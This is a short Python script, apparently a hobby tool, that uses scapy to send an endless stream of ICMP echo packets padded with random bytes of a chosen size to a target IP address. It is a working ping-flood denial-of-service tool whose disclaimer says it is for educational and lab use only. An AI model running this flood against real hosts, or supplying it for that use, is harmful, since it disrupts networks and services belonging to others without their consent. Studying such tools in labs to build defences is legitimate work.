"""
DISCLAIMER
This script is for EDUCATIONAL and LABORATORY purposes ONLY.
DO NOT use against systems or networks you don't own or control
The author is NOT responsible for misuse

"""


#scapy, sys, colorama, ipaddress, time
from scapy.all import IP, ICMP, send, Raw, RandString
from colorama import Fore, init
import sys, ipaddress, time
init(autoreset=True)

if len(sys.argv) < 3:
    print(Fore.RED+f"Usage: python {sys.argv[0]} <Ip> <size>")
    sys.exit(1)

_ip = sys.argv[1]
#validate IP
try:
    ipaddress.ip_address(_ip)
except Exception:
    print(Fore.RED+f"That ip do not exist")
    sys.exit(1)
#size
try:
    size = int(sys.argv[2])
except ValueError:
    print(Fore.RED+"It needs to be a int")
    sys.exit(1)
if size < 0:
    print(Fore.RED+"It has to be greater than 0")
    sys.exit(1)
#-N
parametro=None
try:
    parametro=sys.argv[3]
except IndexError:
    pass

def N():
    if parametro == "-N":
        return size
    else:
        if size > 6550:
            print(Fore.RED+"You have exceeded the byte limit, try with -N")
            sys.exit(1)
        if size < 6550:
            return size
size = N()
if size > 65500:
    print(Fore.RED + f"IPv4 does not support packets bigger than 65535 bytes (you requested {size})")
    sys.exit(1)
#bytes
size_bytes=Raw(RandString(size))
#disclaimer
print(Fore.RED+"Educational use only! Do not use on unauthorized networks")
#packet
packet= IP(dst=_ip)/ICMP()/size_bytes

print(Fore.GREEN+f"Flood sending to {_ip} with {size}B stop with CTRL + C ...")
#flood
try:
    while True:
        send(packet, verbose=False)
        time.sleep(0.001)
except KeyboardInterrupt:
    print(Fore.YELLOW+"Stopped by the user")
    sys.exit(0)
